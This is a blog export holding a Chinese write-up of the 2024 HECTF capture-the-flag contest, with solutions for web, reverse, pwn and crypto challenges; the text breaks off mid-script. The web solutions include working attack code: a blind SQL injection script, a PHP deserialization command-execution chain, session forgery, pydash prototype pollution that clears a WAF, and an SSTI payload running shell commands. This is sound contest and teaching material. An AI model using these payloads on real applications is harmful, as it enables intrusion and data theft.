{"meta":{"title":"Lazzaro","subtitle":"","description":"","author":"Lazzaro","url":"https://lazzzaro.github.io","root":"/"},"pages":[{"title":"留言板","date":"2021-10-16T12:39:04.087Z","updated":"2020-05-21T14:14:51.458Z","comments":true,"path":"guestbook/index.html","permalink":"https://lazzzaro.github.io/guestbook/index.html","excerpt":"","text":""},{"title":"分类","date":"2020-05-06T11:36:47.000Z","updated":"2020-05-06T11:43:15.674Z","comments":true,"path":"categories/index.html","permalink":"https://lazzzaro.github.io/categories/index.html","excerpt":"","text":""},{"title":"标签","date":"2020-05-06T11:36:23.000Z","updated":"2020-05-12T13:48:09.659Z","comments":true,"path":"tags/index.html","permalink":"https://lazzzaro.github.io/tags/index.html","excerpt":"","text":""},{"title":"工具","date":"2020-05-06T11:40:16.000Z","updated":"2020-05-06T11:43:39.465Z","comments":true,"path":"links/index.html","permalink":"https://lazzzaro.github.io/links/index.html","excerpt":"","text":""}],"posts":[{"title":"2024 HECTF","slug":"match-2024-HECTF","date":"2024-12-08T12:43:35.000Z","updated":"2024-12-09T13:01:30.205Z","comments":true,"path":"2024/12/08/match-2024-HECTF/","permalink":"https://lazzzaro.github.io/2024/12/08/match-2024-HECTF/","excerpt":"","text":"​ 河北师范大学信息安全挑战赛是由河北师范大学SourceCode战队组织的面向全国大学生的CTF竞技活动。自HECTF举办至今，每届大赛都会吸引来自全国400多支队伍和校内大量的学生报名参加比赛。 2024HECTF挑战赛是我们举办的第八届赛事，由河北师范大学SourceCode战队发起，河北师范大学计算机与网络空间安全学院主办，河北省网络与信息安全重点实验室和河北师范大学信息安全协会承办，杭州凌武科技有限公司提供竞赛平台及技术支持，是面向全国大学生的一次竞技活动。 竞赛时间： 2024年12月7日09:00-2024年12月8日21:00 题目类别： 线上CTF-JEO（解题）赛制。赛题包括但不限于 Pwn， Reverse ，Crypto ，Web 和 Misc等。 Rank: 3 WEBbaby_unserialize 一个简单的反序列化，一个简单的RCE 构造pop链，RCE部分用通配符绕过： 1234567891011121314151617181920from phpserialize import *from base64 import *class class02: public_payload=&#x27;/bin/ca[s-u] /fla[f-h]||1&#x27;class class00: passclass class01: public_cls=class00() public_str3=class02()class User: public_msg=class01() public_token=&#x27;admin&#x27;s = serialize(User()).replace(&#x27;O:4:&quot;User&quot;:2&#x27;,&#x27;O:4:&quot;User&quot;:3&#x27;)print(s)print(b64encode(s.encode()).decode()) POST: user=Tzo0OiJVc2VyIjozOntzOjM6Im1zZyI7Tzo3OiJjbGFzczAxIjoyOntzOjM6ImNscyI7Tzo3OiJjbGFzczAwIjowOnt9czo0OiJzdHIzIjtPOjc6ImNsYXNzMDIiOjE6e3M6NzoicGF5bG9hZCI7czoyNToiL2Jpbi9jYVtzLXVdIC9mbGFbZi1oXXx8MSI7fX1zOjU6InRva2VuIjtzOjU6ImFkbWluIjt9 得到flag。 ​ Are u happy 开始开心地玩耍吧！ 查看源代码有提示：&lt;!--hint:base64--&gt;，在网页资源的 api/js/game.js 中，搜索 HECTF&#123; 对应的base64编码开头 SEVD，找到： &#39;SEVDVEZ7aU9CbVZmVE1Nc3lvaXJWZ2dXSHk5eUVBNHRIQXlCZWtjQzVOMTNpYX0=&#39;; 解码得flag：HECTF&#123;iOBmVfTMMsyoirVggWHy9yEA4tHAyBekcC5N13ia&#125;。 ​ baby_sql g01den的公司里有个记录员工打卡的后台，只有admin才能登陆，但是，g01den发现，每次去公司视察的时候公司里的员工总数始终和打卡了的员工数目对不上，g01den怀疑公司里的某位员工利用了漏洞，于是他在后台程序里增加了一些WAF，并且他对他自己的WAF很自信，并暗示了那位员工他在数据库里放了一个重要的信息（flag），能拿到这个信息（flag）的人年终可以获得额外的奖金。作为那位员工的你应该如何拿到这个信息获得奖金呢？ flag由HECTF开头，得到的答案请将hectf修改为大写HECTF，flag中除了开头的HECTF外，无大写字母 测试注入点：`name=admin&amp;pw=admin&#39;||(1)||&#39;0。 布尔盲注，从数据库开始找起： 123456789101112131415161718192021222324252627282930313233343536373839404142import requestsurl = &#x27;http://8.153.103.216:31934/&#x27;result = &#x27;&#x27;i = 0while True: i = i + 1 head = 32 tail = 127 while head &lt; tail: mid = (head + tail) &gt;&gt; 1 # payload = f&#x27;if(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&quot;flag1shere&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; # payload = f&#x27;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;lookhere&quot;)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; payload = f&#x27;if(ascii(substr((select(group_concat(flag))from(flag1shere.lookhere)),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)&#x27; data = &#123; &#x27;name&#x27;: &#x27;admin&#x27;, &#x27;pw&#x27;: f&quot;admin&#x27;||(&#123;payload&#125;)||&#x27;0&quot; &#125; r = requests.post(url,data=data) if &#x27;fc2ce1340d3eaa16d68dbfb35d3aaac6&#x27; in r.text: head = mid + 1 else: tail = mid if head != 32: result += chr(head) else: break print(result) # databases: flag1shere# tables: flag_is_in_flag1shere_loockhere_flag,lookhere# column: # 【表flag_is_in_flag1shere_loockhere_flag】hint# 【表lookhere】flag# 内容：# 【表flag_is_in_flag1shere_loockhere_flag】flag# 【表lookhere】HECTF&#123;df1b330bbc2280e5021137e34461c224907f45c3&#125; ​ ezweb Try to be admin to get flag！！！ 提示1 Hint：xxxxx为c、e、f、h、t 这五个没大没小的字母 查看源代码，有注释： 1aWYoJF9HRVRbJ2EnXSAhPSAkX0dFVFsnYiddICYmIG1kNSgkX0dFVFsnYSddKSA9PSBtZDUoJF9HRVRbJ2InXSkpIHsKICAgIGlmICgkX0dFVFsnYyddICE9ICRfR0VUWydkJ10gJiYgbWQ1KCRfR0VUWydjJ10pID09PSBtZDUoJF9HRVRbJ2QnXSkpIHsKICAgICAgICBpZiAoaXNzZXQoJF9HRVRbJ2d1ZXNzJ10pICYmIG1kNSgkX0dFVFsnZ3Vlc3MnXSkgPT09ICdhYTQ3NmNmNzE0M2ZlNjljMjliMzZlNGQwYTc5MzYwNCcpIHsgLy94eHh4eDIwMjQKICAgICAgICAgICAgaGlnaGxpZ2h0X2ZpbGUoInNlY3JldC5waHAiKTsKICAgICAgICB9CiAgICB9Cn0= base64解码得到部分源码： 1234567if($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;] &amp;&amp; md5($_GET[&#x27;a&#x27;]) == md5($_GET[&#x27;b&#x27;])) &#123; if ($_GET[&#x27;c&#x27;] != $_GET[&#x27;d&#x27;] &amp;&amp; md5($_GET[&#x27;c&#x27;]) === md5($_GET[&#x27;d&#x27;])) &#123; if (isset($_GET[&#x27;guess&#x27;]) &amp;&amp; md5($_GET[&#x27;guess&#x27;]) === &#x27;aa476cf7143fe69c29b36e4d0a793604&#x27;) &#123; //xxxxx2024 highlight_file(&quot;secret.php&quot;); &#125; &#125;&#125; 爆破md5： 123456789101112131415from pwn import *from hashlib import md5import stringfrom pwnlib.util.iters import mbruteforcetable = &#x27;HECTFhectf&#x27;def PoW(): suffix = &#x27;2024&#x27; cipher = &#x27;aa476cf7143fe69c29b36e4d0a793604&#x27; proof = mbruteforce(lambda x: md5((x + suffix).encode()).hexdigest() == cipher, table, length=5, method=&#x27;fixed&#x27;) print(proof) PoW()# hECTf GET传值： ?a[]=1&amp;b[]=2&amp;c[]=3&amp;d[]=4&amp;guess=hECTf2024 得到 secret.php 部分源码： 123456789101112error_reporting(0);//mt_srand(rand(1e5,1e7));//$key = rand();//file_put_contents(*,$key);function session_decrypt($session,$key)&#123; $data = base64_decode($session); $method = &#x27;AES-256-CBC&#x27;; $iv_size = openssl_cipher_iv_length($method); $iv = substr($data,0,$iv_size); $enc = substr($data,$iv_size); return openssl_decrypt($enc, $method, $key, 1, $iv);&#125; 写代码爆破key值，顺便替换guest为admin： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php$iv = &#x27;&#x27;;function session_encrypt($data, $key) &#123; $method = &#x27;AES-256-CBC&#x27;; $iv_size = openssl_cipher_iv_length($method); global $iv; $encrypted = openssl_encrypt($data, $method, $key, OPENSSL_RAW_DATA, $iv); return base64_encode($iv . $encrypted);&#125;function session_decrypt($session, $key) &#123; $data = base64_decode($session); $method = &#x27;AES-256-CBC&#x27;; $iv_size = openssl_cipher_iv_length($method); global $iv; $iv = substr($data, 0, $iv_size); $enc = substr($data, $iv_size); return openssl_decrypt($enc, $method, $key, OPENSSL_RAW_DATA, $iv);&#125;function is_valid_decryption($data) &#123; return strpos($data, &quot;guest&quot;) !== false;&#125;$session = &quot;OTTg3UDhQn1AyNy60WpcZU/4iEdqTE/YtcSUUlQPPeqcQKVIhgZUO+wK7t9K64eFhcfieaPsjv9cBrq9LPMxnbvZ//egvZrQ72fXUKz/R0IEzgLXPFP/WDwyexB3KlIl&quot;;$min_seed = 100000;$max_seed = 10000000;for ($seed = $min_seed; $seed &lt; $max_seed; $seed++) &#123; mt_srand($seed); $key = rand(); $decrypted = session_decrypt($session, $key); if (is_valid_decryption($decrypted)) &#123; echo &quot;Key found! Seed: $seed, Key: $key\\n&quot;; echo &quot;Decrypted data: $decrypted\\n&quot;; // Decrypted data: O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;guest&quot;;&#125; $msg = &#x27;O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:4:&quot;role&quot;;s:5:&quot;admin&quot;;&#125;&#x27;; echo session_encrypt($msg, $key); break; &#125;&#125;// Key found! Seed: 9020413, Key: 2041025242// Decrypted data: O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;guest&quot;;s:4:&quot;role&quot;;s:5:&quot;guest&quot;;&#125;// OTTg3UDhQn1AyNy60WpcZU/4iEdqTE/YtcSUUlQPPeqcQKVIhgZUO+wK7t9K64eFzGqWoHSMfEjGvUzTGy6Kp46YHNCB/nFVAJWso8TWfcB92gsD4DWvVQvSpT5EBn/x 替换token，刷新页面，成功伪造为admin，查看源代码得到flag： Here is your flag:&lt;!--HECTF&#123;871d3db4c182eb6d994078bd6c41643a8cd49ace&#125; ​ 你一个人专属的进货网站 w41tm00n第一次学习开发网站，老板让他三天之内搞定。第二天，w41tm00n终于写完了代码，并且进行了调试，网站在服务器上能够正常运行，但是w41tm00n没学过网安的知识，写的网站存在漏洞你作为w41tm00n的好朋友，同时你是位网安的实习生，w41tm00n就找到了你帮他测试网站是否存在漏洞。w41tm00n跟你说，他放了一个线索在服务器上，如果你成功入侵了这个服务器的话就可以得到这个礼物的线索（/flag文件） app.py 中使用了pydash 5.1.2，且在路由 /setUserInfo 使用了 set_(user,key,value)，检索知存在原型链污染漏洞，参考：Pydash 原型链污染。 可在 /setUserInfo 路由内污染任意全局变量，首先修改secretkey： 12POST /setUserInfokey=__class__.__init__.__globals__.app.secret_key&amp;value=123456&amp;Button=%E6%8F%90%E4%BA%A4 将 app.secret_key 修改为 123456，即可伪造flask session： flask-unsign --sign --cookie &quot;&#123;&#39;username&#39;: &#39;aa&#39;, &#39;password&#39;: &#39;bb&#39;, &#39;verify&#39;: &#39;admin&#39;&#125;&quot; --secret &#39;123456&#39; --no-literal-eval eyJwYXNzd29yZCI6ImJiIiwidXNlcm5hbWUiOiJhYSIsInZlcmlmeSI6ImFkbWluIn0.Z1VUWQ.Ae1Tf_dNm81tzQlmgzTrG3yKCjU 进到 /admin，发现用户名回显，可利用SSTI漏洞，但需绕过黑盒WAF。 结合 /setUserInfo 修改username，再访问 /admin，测试WAF的 blasklist 内容，发现同时过滤了两种花括号头，无法SSTI。 想到同样可利用原型链污染清空 WAF.py 里的 blacklist 值： 12POST /setUserInfokey=__class__.__init__.__globals__.WAF.blacklist&amp;value=1&amp;Button=%E6%8F%90%E4%BA%A4 最后正常SSTI： 12POST /setUserInfokey=username&amp;value=&#123;&#123;cycler.__init__.__globals__.os.popen(&#x27;cat /flag&#x27;).read()&#125;&#125;&amp;Button=%E6%8F%90%E4%BA%A4 访问 /admin 得到flag。 ​ REVERSEbabyre g01den最近学会了一个简单的算法，于是他迫不及待的写下了这个程序。同时他在这个程序里面藏了一些秘密，你能发现他藏在程序里面的秘密吗？ IDA分析逻辑，在代码 sub_1920(v9, v7); 处，实现了变表base64加密，表为： yzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/abcdefghijklmnopqrstuvwx 在代码 sub_17A7(v9); 处，先异或 i/3，再比较字符串。 提取出密文，逆： 123456c = b&#x27;QCTCUBZvOFHs\\\\F&#125;kNPUhQU&#125;&gt;E]CgE&gt;;=GIS TYC`@_I~E8u8G|%)Z&#125;Yc_FW8_By(&#x27;# 还原x = list(c)y = bytes([x[i]^(i//3) for i in range(len(x))])# QCTBTCXtMEKpXBynKUSnWRz9MUKnL717MBX+XUOmMRGpK7z7Wl58KlKqMUD+KVm= 再Cyberchef解变表base64，得flag：HECTF&#123;8c7d051e5a0e9c567c86fed492720cc8d3389af1&#125;。 ​ littleasm 百行代码里的藏匿的flag 给定汇编代码，利用GPT快速还原大概伪码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;string.h&gt;// 定义数据部分char flag[28];const char key[3] = &#123;&#x27;r&#x27;, &#x27;e&#x27;, &#x27;v&#x27;&#125;;unsigned char data[28] = &#123;0x6a, 0x28, 0x3d, 0x4e, 0x2b, 0x05, 0x63, 0x1e, 0x0d, 0x73, 0x10, 0x1c, 0x73, 0x24, 0x21, 0x73, 0x5e, 0x21, 0x31, 0x5d, 0x21, 0x3f, 0x0c, 0x0d, 0x6d, 0x4c, 0x3&#125;;const char *msg_wrong = &quot;WRONG!!!\\n&quot;;const char *msg_right = &quot;Right!!\\n&quot;;int main() &#123; // 读取用户输入的 flag printf(&quot;Enter flag: &quot;); scanf(&quot;%27s&quot;, flag); // 加密过程 for (int i = 0; i &lt; 28; i += 3) &#123; // 第一组 int key_index = (i + 2) % 3; data[i] = (flag[i] ^ key[key_index]) + 0x2C; // 第二组 if (i + 1 &lt; 28) &#123; key_index = (i + 1) % 3; data[i + 1] = (flag[i + 1] ^ key[key_index]) + 0x08; &#125; // 第三组 if (i + 2 &lt; 28) &#123; key_index = i % 3; data[i + 2] = (flag[i + 2] ^ key[key_index]) ^ 0x0C; &#125; &#125; // 校验加密结果 int wrong = 0; for (int i = 0; i &lt; 28; i++) &#123; if (flag[i] != data[i]) &#123; wrong = 1; break; &#125; &#125; // 打印结果 if (wrong) &#123; printf(&quot;%s&quot;, msg_wrong); &#125; else &#123; printf(&quot;%s&quot;, msg_right); &#125; return 0;&#125; 根据逻辑逆： 1234567891011121314151617c = [0x6a, 0x28, 0x3d, 0x4e, 0x2b, 0x05, 0x63, 0x1e, 0x0d, 0x73, 0x10, 0x1c, 0x73, 0x24, 0x21, 0x73, 0x5e, 0x21, 0x31, 0x5d, 0x21, 0x3f, 0x0c, 0x0d, 0x6d, 0x4c, 0x3]print(len(c))k = list(b&#x27;rev&#x27;)f = [-1]*len(c)for i in range(0,len(c),3): if i+2&lt;28: f[i+2] = (c[i+2]^0xc)^k[i%3] if i+1&lt;28: f[i+1] = (c[i+1]-0x8)^k[(i+1)%3] f[i] = (c[i]-0x2c)^k[(i+2)%3]f = [k&amp;0xff for k in f]print(bytes(f))# b&#x27;HECTF&#123;Ass1mb1y_13_s0_eas7!&#125;&#x27; ​ PE?py? 在pyre里找到压缩包密码 16进制查看 pyre.exe，修复：1. 开头 MM 改 MZ，2. DosHeader里的 LONG AddressOfNewExeHeader 改为 0x108h。 pyinstxtractor解包，反编译 pyre.pyc： 1234print(&#x27;PE?py?\\n&#x27;)data = &#x27;the_key_is_:&#x27;key = &#x27;Have_a_cup_of_tea_together&#x27;print(&#x27;Can you uncover the secrets of this file?&#x27;) 用 Have_a_cup_of_tea_together 为密码解压 do_you_like_tea.zip，得到 main1.exe。 IDA分析，是一个标准xtea，逆： 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *def decrypt(v, k): v0 = v[0] v1 = v[1] delta = 0x9E3779B9 x = delta * 32 for i in range(32): v1 -= (((v0 &lt;&lt; 4) ^ (v0 &gt;&gt; 5)) + v0) ^ (x + k[(x &gt;&gt; 11) &amp; 3]) v1 = v1 &amp; 0xFFFFFFFF x -= delta x = x &amp; 0xFFFFFFFF v0 -= (((v1 &lt;&lt; 4) ^ (v1 &gt;&gt; 5)) + v1) ^ (x + k[x &amp; 3]) v0 = v0 &amp; 0xFFFFFFFF v[0] = v0 v[1] = v1 return vkey = [0x54434548, 0x32303246, 0x69617734, 0x756F7974]encrypted = [0x0DF596194, 0x2CFE74D6, 0x1355AE4D, 0x0B6717A87, 0x0F27BB57B, 0x8D436C5, 0x0C5C8E1AF, 0x0A85BD8F, 0x19A70032, 0x400CFEF4, 0x0AF02E1FC, 0x0CDEDCFB4]decrypted = []final = b&#x27;&#x27;for i in range(len(encrypted)//2): now = decrypt(encrypted[2*i:2*(i+1)], key) decrypted += now final += long_to_bytes(now[0])[::-1] + long_to_bytes(now[1])[::-1]print(final)# b&#x27;HECTF&#123;58de01fc-af6b-8cf6-e8ca-db5964ce0b1e&#125;\\x00&#x27; ​ easyree flag格式HECTF{xxxx} 16进制查看，改 CTF 为 UPX，脱壳。 IDA分析，在 main() 函数中，先经过 encrypt() 函数变种凯撒移位，再简单异或操作。 逆： 12345678910111213141516171819202122c = [35, 33, 32, 40, 37, 126, 40, 70, 82, 4, 75, 82, 76, 3, 82, 4, 72, 79, 123, 79, 125, 66, 68, 4, 79, 73, 112]for k in range(128): m = [] for i in range(len(c)): m.append((c[i]^k)+21) mb = bytes(m) if b&#x27;&#123;&#x27; in mb and b&#x27;&#125;&#x27; in mb and mb.isascii(): print(k, mb) tot = 8 for j in range(len(m)): if m[j] &gt; 96 and m[j] &lt;= 122: m[j] = (m[j] - 97 - tot) % 26 + 97 tot += 1 elif m[j] &gt; 65 and m[j] &lt;= 90: m[j] = (m[j] - 65 - tot) % 26 + 65 tot += 1 print(bytes(m)) break # 24 b&#x27;PNMER&#123;Es_1h_i0_1elxlzoq1lf&#125;&#x27;# b&#x27;HECTF&#123;Re_1s_s0_1nterest1ng&#125;&#x27; ​ PWNsign in 快来签到吧…… close(1) 关闭了输出，重定向即可。 123456789101112from pwn import *r = remote(&#x27;8.153.103.216&#x27;,32544)r.recvline()r.sendline(b&#x27;x&#x27;)r.recvline()r.send(b&#x27;HECTF2024!&#x27;)r.recvline()r.sendline(b&#x27;exec 1&gt;&amp;0&#x27;)r.interactive() ​ CRYPTO迷茫的艾米莉 在维吉尼亚小镇，园丁艾米莉的responsibility是照顾一座古老花园，每天修剪六段绿篱栅栏。一天，她 发现通往秘密花园的小径，入口却被封上了，上面有一串密文Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lr，请输入密码帮助艾米莉探索秘密花园 栅栏6+vigenere密码（key=responsibility）。 flag：HECTF&#123;C0ng2at51ations_0n_comin9_in&#125;。 ​ seven more more than more no co-prime 给了 $p,q$，且 $\\gcd(e,p)=e,\\gcd(e,q)=e’,e’ \\mid e$。 分别在 $\\mod p$ 和 $\\bmod q$ 上使用AMM算法求根，最后CRT找flag。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110import randomimport timefrom Crypto.Util.number import *from tqdm import *# About 3 seconds to rundef AMM(o, r, q): start = time.time() print(&#x27;\\n----------------------------------------------------------------------------------&#x27;) print(&#x27;Start to run Adleman-Manders-Miller Root Extraction Method&#x27;) print(&#x27;Try to find one &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;&#x27;.format(r, o, q)) g = GF(q) o = g(o) p = g(random.randint(1, q)) while p ^ ((q-1) // r) == 1: p = g(random.randint(1, q)) print(&#x27;[+] Find p:&#123;&#125;&#x27;.format(p)) t = 0 s = q - 1 while s % r == 0: t += 1 s = s // r print(&#x27;[+] Find s:&#123;&#125;, t:&#123;&#125;&#x27;.format(s, t)) k = 1 while (k * s + 1) % r != 0: k += 1 alp = (k * s + 1) // r print(&#x27;[+] Find alp:&#123;&#125;&#x27;.format(alp)) a = p ^ (r**(t-1) * s) b = o ^ (r*alp - 1) c = p ^ s h = 1 for i in range(1, t): d = b ^ (r^(t-1-i)) if d == 1: j = 0 else: print(&#x27;[+] Calculating DLP...&#x27;) j = - discrete_log(a, d) print(&#x27;[+] Finish DLP...&#x27;) b = b * (c^r)^j h = h * c^j c = c ^ r result = o^alp * h end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) print(&#x27;Find one solution: &#123;&#125;&#x27;.format(result)) return resultdef findAllPRoot(p, e): print(&quot;Start to find all the Primitive &#123;:#x&#125;th root of 1 modulo &#123;&#125;.&quot;.format(e, p)) start = time.time() proot = set() while len(proot) &lt; e: proot.add(pow(random.randint(2, p-1), (p-1)//e, p)) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return prootdef findAllSolutions(mp, proot, cp, p, e): print(&quot;Start to find all the &#123;:#x&#125;th root of &#123;&#125; modulo &#123;&#125;.&quot;.format(e, cp, p)) start = time.time() all_mp = set() for root in proot: mp2 = mp * root % p assert(pow(mp2, e, p) == cp) all_mp.add(mp2) end = time.time() print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start)) return all_mp n = 211174039496861685759253930135194075344490160159278597570478160714793843648384778026214533259531963057737358092962077790023796805017455012885781079402008604439036453706912819711606916173828620000813663524065796636039272173716362247511054616756763830945978879273812551204996912252317081836281439680223663883250992957309172746671265758427396929152878633033380299036765665530677963287445843653357154379447802151146728382517702550201c = 191928992610587693825282781627928404831411364407297375816921425636703444790996279718679090695773598752804431891678976685083991392082287393228730341768083530729456781668626228660243400914135691435374881498580469432290771039798758412160073826112909167507868640830965603769520664582121780979767127925146139051005022993085473836213944491149411881673257628267851773377966008999511673741955131386600993547529438576918914852633139878066p = 31160882390461311665815471693453819123352546432384109928704874241292707178454748381602275005604671000436222741183159072136366212086549437801626015758789167455043851748560416003501637268653712148286072544482747238223q = 6776895366785389188349778634427547683984792095011326393872759455291221057085426285502176493658280343252730331506803173791893339840460125807960788857396637337440004750209164671124188980183308151635629356496128717687e = 1009 * 7# gcd(e,p-1)=7063# gcd(e,q-1)=1009# pcp = c % pmp = AMM(cp, e, p)p_proot = findAllPRoot(p, e)mps = findAllSolutions(mp, p_proot, cp, p, e)print(len(mps))# qe2 = 1009d2 = inverse(e//1009, q-1)cq = pow(c, d2, q)mq = AMM(cq, e2, q)q_proot = findAllPRoot(q, e2)mqs = findAllSolutions(mq, q_proot, cq, q, e2)print(len(mqs))start = time.time()print(&#x27;Start CRT...&#x27;)for mpp in tqdm(mps): for mqq in mqs: m = CRT_list([int(mpp), int(mqq)], [p, q]) res = long_to_bytes(int(m)) if b&#x27;HECTF&#x27; in res: print(res) #print(time.time() - start)end = time.time()print(&quot;Finished in &#123;&#125; seconds.&quot;.format(end - start))# 79%|███████████████████████████████████████████████████████████████▉ | 5573/7063 [04:08&lt;01:05, 22.78it/s]b&#x27;HECTF&#123;go0d_jOb_At_AmM&#125;D~u3&lt;1\\xdd\\x9f\\x81b:,\\xbe\\xf2\\x1c\\xf1\\xd5\\xeeN\\xb7w\\xce\\xae?\\xf3~\\x99\\xbd\\xce\\xf1\\xf1\\x10&quot;\\xc6:\\x85\\x08\\xf0\\xef4h\\x8c%d\\x9f\\xf1\\xaf\\xfdS\\xd1\\xcc\\x99\\x1c\\xc3\\xe5\\x06Z\\xdags\\xb5R&gt;\\xc9\\xd4\\xb7\\x99\\xde\\x9f\\xb0\\xccP\\xf2\\xba\\x82A\\xfd\\xbb\\xda\\x0e\\xf9\\xa5\\xaa\\xfcm\\x92\\xba\\xa8\\xff\\xf8*\\x8a\\x95p\\xb6\\xbe\\xc5\\xbf\\xbe\\xe8c&#x27; ​ 翻一翻 小明最近失恋了，翻来覆去睡不着，请帮他找出失恋的关键信息 emirp() 函数表示反素数，$q$ 为 $p$ 的十进制反素数。 参考ASIS 2015 Finals - RSASR，按位爆破，结合条件剪枝。 12345678910111213141516171819202122232425262728293031323334353637383940414243from Crypto.Util.number import *n = 404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993c = 365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778e = 65537def t(a, b, k): # sqrt(n) has 155 digits, so we need to figure out 77 digits on each side if k == 77: if a*b == n: print((a,b)) return for i in range(10): for j in range(10): # we try to guess the last not-already-guessed digits of both primes a1 = a + i*(10**k) + j*(10**(154-k)) b1 = b + j*(10**k) + i*(10**(154-k)) if a1*b1 &gt; n: # a1 and b1 are too large continue if (a1+(10**(154-k)))*(b1+(10**(154-k))) &lt; n: # a1 and b1 are too small continue if ((a1*b1)%(10**(k+1))) != (n%(10**(k+1))): # The last digits of a1*b1 (which won&#x27;t change later) doesn&#x27;t match n continue # this a1 and b1 seem to be a possible match, try to guess remaining digits t(a1, b1, k+1)# the primes have odd number of digits (155), so we try all possible middle digits (it simplifies the code)#for i in range(10):# t(i*(10**77), i*(10**77), 0)# (39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201, 10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393)p,q = (39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201, 10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393)f = (p-1)*(q-1)d = inverse(e,f)m = pow(c,d,n)print(long_to_bytes(m))# b&#x27;SEVDVEZ7SV9yZWExbHlfbDB2ZV9jMnlwdG8hfQ==&#x27;# HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125; ​ 不合格的魔药 刚开始学习魔药的小A总是只关注魔药的颜色而忽略配比，这次他配置的魔药又是这样，这样一份不合格的魔药完全没办法达到对信息“保密”的效果了，请从这份面目全非的成品中还原出小A想隐藏的信息 [hint1] key&lt;60000 第一步，由 $\\text{order}=p+1$ 尝试MOV attack无果，后根据hint1，爆破 $k$ 值。 第二步，密文满足： $(2G)_x \\oplus c_0 = C_0,(2G)_y \\oplus c_1 = C_1$ $(4G)_x \\oplus c_2 = C_2,(4G)_y \\oplus c_3 = C_3$ 由于 $c_i$ 只有16*8=128位，异或过程中只会改变 $(kG)_x$ 或 $(kG)_y$ 的低128位值，即高位已知，结合ECC方程利用coppersmith求解 $2G$ 和 $4G$，再异或还原回 $c_i$。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119from Crypto.Util.number import *from tqdm import *from hashlib import *from Crypto.Cipher import AESimport itertools# from https://github.com/defund/coppersmith/blob/master/coppersmith.sagedef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []p = 9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487q = 7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079a = 4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995b = 5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431x1 = 5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403Ep_point = (0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d, 0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b)c = [36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820, 20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332, 